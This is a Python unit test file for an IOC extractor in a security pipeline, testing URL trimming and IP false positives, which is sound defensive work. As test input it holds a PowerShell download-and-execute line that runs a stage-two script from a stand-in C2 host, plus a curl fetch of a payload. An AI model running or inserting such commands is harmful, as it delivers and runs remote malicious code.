"""Unit tests for pipeline.ioc_extract — focused on URL trailing-junk trimming.

Regression coverage for the deobfuscation case where a URL is captured inside
quotes (e.g. DownloadString('http://c2/x')) and the closing quote stayed
attached to the URL IOC value.
"""

from __future__ import annotations

from isoc_api.db.enums import IOCType
from isoc_api.pipeline import ioc_extract


def _urls(normalized: dict, raw: str) -> list[str]:
    return [v for (t, v) in ioc_extract.extract(normalized, raw) if t == IOCType.URL]


def _ips(normalized: dict, raw: str) -> list[str]:
    return [v for (t, v) in ioc_extract.extract(normalized, raw) if t == IOCType.IPV4]


# ── Version-string false-positive IP guard (CASE-001079) ────────────────────
def test_dotnet_assembly_version_not_extracted_as_ip():
    raw = (
        "Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0, "
        "Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    )
    assert "3.0.0.0" not in _ips({}, raw)


def test_version_prefix_not_extracted_as_ip():
    assert "1.2.3.4" not in _ips({}, "Agent ver: 1.2.3.4 started")
    assert "10.0.0.1" not in _ips({}, "app v10.0.0.1 loaded")


def test_longer_dotted_sequence_not_extracted_as_ip():
    # 1.2.3.4.5 is a 5-segment version, not an IP.
    assert _ips({}, "build 1.2.3.4.5 deployed") == []


def test_real_public_ip_in_raw_still_extracted():
    assert "8.8.8.8" in _ips({}, "connection from src=8.8.8.8 to dst port 443")


def test_parser_provided_ip_unaffected_by_version_guard():
    # Structured src_ip is never routed through the raw fallback guard.
    assert "3.0.0.0" in _ips({"src_ip": "3.0.0.0"}, "Version=3.0.0.0")


def test_url_in_single_quotes_strips_trailing_quote():
    raw = "IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.evil.example/stage2.ps1')"
    urls = _urls({}, raw)
    assert "http://malicious-c2.evil.example/stage2.ps1" in urls
    assert all(not u.endswith(("'", '"', ")", ",", ".", ";")) for u in urls)


def test_url_in_double_quotes_strips_trailing_quote():
    raw = 'curl "http://bad.example/payload.bin"'
    urls = _urls({}, raw)
    assert "http://bad.example/payload.bin" in urls


def test_url_trailing_sentence_punctuation_trimmed():
    raw = "Beacon to http://bad.example/c2, then exfil."
    urls = _urls({}, raw)
    assert "http://bad.example/c2" in urls


def test_clean_url_unchanged():
    raw = "connection to http://bad.example/a/b?x=1"
    urls = _urls({}, raw)
    assert "http://bad.example/a/b?x=1" in urls


def test_domain_still_derived_from_quoted_url():
    raw = "DownloadString('http://malicious-c2.evil.example/stage2.ps1')"
    doms = [v for (t, v) in ioc_extract.extract({}, raw) if t == IOCType.DOMAIN]
    assert "malicious-c2.evil.example" in doms
